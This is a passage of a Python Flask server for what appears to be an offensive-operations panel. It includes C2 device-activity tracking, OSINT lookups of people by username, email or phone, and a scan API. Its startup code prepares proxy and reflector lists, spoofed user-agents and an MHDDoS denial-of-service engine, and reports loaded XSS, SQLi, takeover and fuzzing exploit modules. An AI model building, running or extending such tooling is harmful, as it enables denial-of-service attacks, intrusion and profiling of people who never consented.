    if not device_id or not action:
        return jsonify({"error": "device_id_and_action_required"}), 400
    device_name = next(
        (dev["name"] for dev in _c2_devices if dev["id"] == device_id),
        device_id,
    )
    with _c2_lock:
        _c2_activities.append({
            "device_id": device_id,
            "device_name": device_name,
            "action": action,
            "timestamp": d.get("timestamp") or _now_iso(),
        })
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# 404 HANDLER
# ═══════════════════════════════════════════════════════════════════════════
@app.errorhandler(404)
def page_not_found(e):
    if request.path.startswith("/api/"):
        return jsonify({"error": "not_found", "path": request.path}), 404
    username = session.get("username") if session.get("authenticated") else "Guest"
    html = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 — Lost Area</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;
     display:flex;flex-direction:column;justify-content:center;align-items:center;
     height:100vh;text-align:center}
h1{font-size:clamp(1.2rem,3.5vw,2.5rem);font-weight:300;letter-spacing:.35em;
   text-transform:uppercase;margin:0 0 20px}
.user{font-size:.9rem;letter-spacing:.2em;color:#aaa;text-transform:uppercase;
      margin-bottom:10px}
.url{position:absolute;bottom:20px;font-size:.7rem;color:#888;
     word-break:break-all;padding:0 20px}
</style></head><body>
<div class="user">__USERNAME__</div>
<h1>Lost Area</h1>
<div class="url" id="u"></div>
<script>document.getElementById('u').textContent=location.href;</script>
</body></html>"""
    return html.replace("__USERNAME__", username), 404


# ═══════════════════════════════════════════════════════════════════════════
# SERVER NAME / SERVERS / PROFILE
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/server-name", methods=["GET", "POST"])
@login_required
def server_name():
    if request.method == "GET":
        return jsonify({"name": _load_json("settings", {}).get("server_name", "")})
    u = current_user()
    if u and u.get("role") != "owner":
        return jsonify({"error": "Owner access required"}), 403
    body = _json_body()
    with _json_lock("settings"):
        settings = _load_json("settings", {})
        settings["server_name"] = (body.get("name") or "").strip()
        _save_json("settings", settings)
    logger.info("Server name set to '%s' by '%s'",
                settings["server_name"], session.get("username"))
    return jsonify({"name": settings["server_name"]})


@app.route("/api/settings/servers")
@owner_required
def panel_manager():
    return jsonify(_load_json("servers", []))


ALLOWED_IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}


@app.route("/api/profile/photo", methods=["POST"])
@login_required
def profile_photo():
    u = current_user()
    if not u:
        return jsonify({"error": "not_authenticated"}), 401
    body = _json_body()
    with _json_lock("profiles"):
        profiles = _load_json("profiles", {})
        profile = profiles.setdefault(u["username"], {})
        if body.get("remove"):
            profile["avatar_url"] = None
            _save_json("profiles", profiles)
            return jsonify({"ok": True, "avatar_url": None})
        if body.get("url"):
            url = (body["url"] or "").strip()
            if not url.startswith(("http://", "https://")):
                return jsonify({"error": "invalid_image_url"}), 400
            profile["avatar_url"] = url
            _save_json("profiles", profiles)
            return jsonify({"ok": True, "avatar_url": url})
        if body.get("image_base64"):
            data_url = body["image_base64"]
            try:
                header, encoded = data_url.split(",", 1)
                mime = header.split(";")[0].replace("data:", "")
                if mime not in ALLOWED_IMAGE_TYPES:
                    return jsonify({"error": "unsupported_image_type"}), 400
                raw = base64.b64decode(encoded)
                if len(raw) > 5 * 1024 * 1024:
                    return jsonify({"error": "image_too_large",
                                    "max_bytes": 5242880}), 400
                ext = mime.split("/")[1]
                filename = f"{u['username']}_{uuid.uuid4().hex[:8]}.{ext}"
                with open(os.path.join(UPLOAD_DIR, filename), "wb") as f:
                    f.write(raw)
                profile["avatar_url"] = f"/api/profile/photo/{filename}"
                _save_json("profiles", profiles)
                return jsonify({"ok": True, "avatar_url": profile["avatar_url"]})
            except (ValueError, binascii.Error):
                return jsonify({"error": "cannot_decode_image"}), 400
    return jsonify({"error": "provide_image_base64_url_or_remove"}), 400


@app.route("/api/profile/photo/<path:filename>")
def serve_profile_photo(filename):
    return send_from_directory(UPLOAD_DIR, filename)


# ═══════════════════════════════════════════════════════════════════════════
# GLOBAL CHAT
# ═══════════════════════════════════════════════════════════════════════════
CHAT_HISTORY_LIMIT = 300
_chat_cache = {"data": None, "mtime": 0.0}
_chat_cache_lock = threading.Lock()


def _get_chat_cached():
    path = os.path.join(DATA_DIR, "chat.json")
    try:
        mtime = os.path.getmtime(path)
    except OSError:
        return {"messages": [], "locked": False}
    with _chat_cache_lock:
        if _chat_cache["data"] is not None and _chat_cache["mtime"] == mtime:
            return _chat_cache["data"]
    data = _load_json("chat", {"messages": [], "locked": False})
    with _chat_cache_lock:
        _chat_cache["data"] = data
        _chat_cache["mtime"] = mtime
    return data


@app.route("/api/chat/messages")
@login_required
def chat_messages():
    chat = _get_chat_cached()
    profiles = _load_json("profiles", {})
    users_by_name = {u["username"]: u for u in _load_json("users", [])}
    enriched = []
    for m in chat.get("messages", []):
        u = users_by_name.get(m.get("username"))
        enriched.append({
            **m,
            "role": u.get("role") if u else m.get("role", "--"),
            "avatar_url": profiles.get(m.get("username"), {}).get("avatar_url"),
        })
    return jsonify({"messages": enriched, "locked": chat.get("locked", False)})


@app.route("/api/chat/send", methods=["POST"])
@login_required
def chat_send():
    u = current_user()
    if not u:
        return jsonify({"error": "not_authenticated"}), 401
    body = _json_body()
    text = (body.get("text") or "").strip()
    if not text:
        return jsonify({"error": "message_text_required"}), 400
    text = text[:500]
    with _json_lock("chat"):
        chat = _load_json("chat", {"messages": [], "locked": False})
        if chat.get("locked") and u.get("role") != "owner":
            return jsonify({"error": "chat_locked_by_owner"}), 423
        message = {
            "id": uuid.uuid4().hex,
            "username": u["username"],
            "role": u["role"],
            "text": text,
            "timestamp": _now_iso(),
        }
        chat["messages"].append(message)
        chat["messages"] = chat["messages"][-CHAT_HISTORY_LIMIT:]
        _save_json("chat", chat)
    return jsonify({"ok": True, "id": message["id"]})


@app.route("/api/chat/lock", methods=["POST"])
@owner_required
def chat_lock():
    body = _json_body()
    with _json_lock("chat"):
        chat = _load_json("chat", {"messages": [], "locked": False})
        chat["locked"] = bool(body.get("locked"))
        chat["messages"].append({
            "id": uuid.uuid4().hex,
            "is_system": True,
            "text": f'{session.get("username")} '
                    f'{"locked" if chat["locked"] else "unlocked"} Global Chat.',
            "timestamp": _now_iso(),
        })
        _save_json("chat", chat)
    return jsonify({"ok": True, "locked": chat["locked"]})


# ═══════════════════════════════════════════════════════════════════════════
# OSINT
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/osint/search", methods=["POST"])
@login_required
def osint_search():
    body = _json_body()
    method = body.get("method")
    query = (body.get("query") or "").strip()
    if method not in ("username", "email", "number") or not query:
        return jsonify({"error": "method_and_query_required"}), 400
    try:
        osint_module = import_module("modules.osint")
    except ModuleNotFoundError:
        return jsonify({"error": "osint_module_not_found"}), 404
    try:
        results = osint_module.search(method, query)
    except Exception as e:
        logger.error("modules.osint.search raised: %s", e)
        return jsonify({"error": f"osint_error: {e}"}), 500
    logger.info("OSINT search (%s) by '%s': %s",
                method, session.get("username"), query)
    return jsonify({"sources": results})


# ═══════════════════════════════════════════════════════════════════════════
# API v1
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/v1/ping", methods=["POST"])
@_api_key_required
def v1_ping():
    return jsonify({"ok": True, "server_time": _now_iso(),
                    "owner": g.api_key_owner})


@app.route("/api/v1/scan", methods=["POST"])
@_api_key_required
def v1_scan_start():
    body = _json_body()
    target = (body.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    return jsonify({"job_id": scan_orchestrator.start_scan(
        target, body.get("mode") or "basic", body.get("tools") or [],
        history_store)})


@app.route("/api/v1/scan/<job_id>")
@_api_key_required
def v1_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(progress)


# ═══════════════════════════════════════════════════════════════════════════
# STARTUP HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def _ensure_engine_layout():
    files_dir = Path(PROJECT_ROOT) / "files"
    proxies_dir = files_dir / "proxies"
    proxies_dir.mkdir(parents=True, exist_ok=True)
    MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)

    config_path = Path(PROJECT_ROOT) / "config.json"
    if not config_path.exists():
        config_path.write_text(
            json.dumps({"proxy-providers": [],
                        "MINECRAFT_DEFAULT_PROTOCOL": 758}, indent=2),
            encoding="utf-8")

    for name in ALLOWED_PROXY_FILES:
        p = proxies_dir / name
        if not p.exists():
            p.write_text("", encoding="utf-8")
    for name in ALLOWED_REFLECTOR_FILES:
        p = files_dir / name
        if not p.exists():
            p.write_text("", encoding="utf-8")

    ua_path = files_dir / "useragent.txt"
    if not ua_path.exists() or not ua_path.read_text(
            encoding="utf-8", errors="ignore").strip():
        ua_path.write_text(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36\n", encoding="utf-8")

    ref_path = files_dir / "referers.txt"
    if not ref_path.exists() or not ref_path.read_text(
            encoding="utf-8", errors="ignore").strip():
        ref_path.write_text(
            "https://www.google.com/\n"
            "https://www.bing.com/\n"
            "https://duckduckgo.com/\n", encoding="utf-8")


def _check_route_collisions():
    seen = {}
    for rule in app.url_map.iter_rules():
        for method in (rule.methods or set()) - {"HEAD", "OPTIONS"}:
            key = (rule.rule, method)
            if key in seen:
                logger.warning("Route collision: %s %s (from %s and %s)",
                               method, rule.rule, seen[key], rule.endpoint)
            seen[key] = rule.endpoint


def _print_startup(port=None):
    print(BANNER, flush=True)
    print(BANNER_TAGLINE, flush=True)
    print(f"  {'─' * 68}", flush=True)
    lines = []
    if port is not None:
        lines.append(f"  Server     : http://localhost:{port}")
    lines.append(f"  Tools      : {len(scan_orchestrator.list_tools())} loaded")
    lines.append(f"  Account    : {DEFAULT_USERNAME}")
    lines.append(f"  MHDDoS     : "
                 f"{'ready' if MHDDOS_SCRIPT.exists() else 'start.py missing'}")
    lines.append(f"  Engine py  : {PYTHON_EXE}")
    lines.append(f"  HTTP log   : {'ready' if http_logger else 'unavailable'}")
    mods = []
    if _xss_available:      mods.append("XSS")
    if _sqli_available:     mods.append("SQLi")
    if _sniper_available:   mods.append("Sniper")
    if _takeover_available: mods.append("Takeover")
    if _dirfuzz_available:  mods.append("Dirfuzz")
    lines.append(f"  Exploit    : {', '.join(mods) or 'none'}")
    print("\n".join(lines), flush=True)
    print(f"  {'─' * 68}", flush=True)
    print(f"  Started at : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
          flush=True)
    print(flush=True)


# ═══════════════════════════════════════════════════════════════════════════
# GRACEFUL SHUTDOWN
# ═══════════════════════════════════════════════════════════════════════════
_shutdown_lock = threading.Lock()
_shutdown_done = False


def _graceful_shutdown(*_args):
    global _shutdown_done
    with _shutdown_lock:
        if _shutdown_done:
            return
        _shutdown_done = True
    logger.info("Shutdown signal received — cancelling jobs")
    for fn in (job_manager.cancel_all,
               scan_orchestrator.cancel_all,
               _mhddos_stop_all):
        try:
            fn()
        except Exception:
            pass
    try:
        if http_logger is not None:
            http_logger.close()
    except Exception:
        pass
    time.sleep(0.5)


atexit.register(_graceful_shutdown)


def _signal_handler(signum, _frame):
    _graceful_shutdown()
    sys.exit(0)


for _sig_name in ("SIGINT", "SIGTERM"):
    if hasattr(signal, _sig_name):
        try:
            signal.signal(getattr(signal, _sig_name), _signal_handler)
        except (ValueError, OSError):
            pass


# ═══════════════════════════════════════════════════════════════════════════
# MODULE-LEVEL BOOTSTRAP (runs under gunicorn too)
# ═══════════════════════════════════════════════════════════════════════════
_bootstrap_lock = threading.Lock()
_bootstrap_done = False


def _bootstrap():
    """Run first-run setup + start background services. Idempotent."""
    global _bootstrap_done
    with _bootstrap_lock:
        if _bootstrap_done:
            return
        _bootstrap_done = True

    try:
        ensure_default_user()
    except Exception as e:
        logger.warning("ensure_default_user failed: %s", e)

    try:
        auto_restart_bot()
    except Exception as e:
        logger.warning("auto_restart_bot failed: %s", e)

    _ensure_engine_layout()
    _check_route_collisions()
    job_manager.start_sweeper()

    def _warmup():
        if _xss_available and xss_module is not None:
            try:
                n = len(xss_module.load_wordlist())
                logger.info("XSS wordlist ready — %d payloads", n)
            except Exception as e:
                logger.warning("XSS wordlist warmup failed: %s", e)
        if _dirfuzz_available and dirfuzz_module is not None:
            try:
                n = len(dirfuzz_module.load_wordlist("lottery-dirs.txt",
                                                       max_lines=200))
                logger.info("Dirfuzz wordlist ready — %d entries", n)
            except Exception as e:
                logger.warning("Dirfuzz wordlist warmup failed: %s", e)
        if _sqli_available and sqli_module is not None:
            try:
                sqli_module.ensure_wordlists()
                logger.info("SQLi wordlists ready")
            except Exception as e:
                logger.warning("SQLi wordlist warmup failed: %s", e)

    threading.Thread(target=_warmup, daemon=True,
                     name="wordlist-warmup").start()


_bootstrap()


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # reset-password subcommand
    if len(sys.argv) > 1 and sys.argv[1] == "reset-password":
        existing_role = get_role(DEFAULT_USERNAME) or "owner"
        new_password = create_user(DEFAULT_USERNAME, role=existing_role)
        print(BANNER, flush=True)
        print(f"  Password reset for '{DEFAULT_USERNAME}' "
              f"(role={existing_role})", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Copy it now — it will not be shown again.", flush=True)
        sys.exit(0)

    # First-run message
    new_password = ensure_default_user()
    if new_password:
        print(BANNER, flush=True)
        print("  First run — account created automatically", flush=True)
        print(f"  Username: {DEFAULT_USERNAME}", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Role:     owner", flush=True)
        print("  Save this password now.", flush=True)
        print(flush=True)

    default_port = int(Config.PORT) if hasattr(Config, "PORT") else 8080
    port = default_port
    try:
        port_input = input(
            f"Enter port (default {default_port}, press Enter for default): "
        ).strip()
        if port_input:
            port = int(port_input)
            if not (1 <= port <= 65535):
                print(f"Invalid port, using default {default_port}")
                port = default_port
    except (ValueError, EOFError):
        port = default_port

    _print_startup(port)

    app.run(
        host="0.0.0.0",
        port=port,
        debug=False,
        threaded=True,
        use_reloader=False,
    )
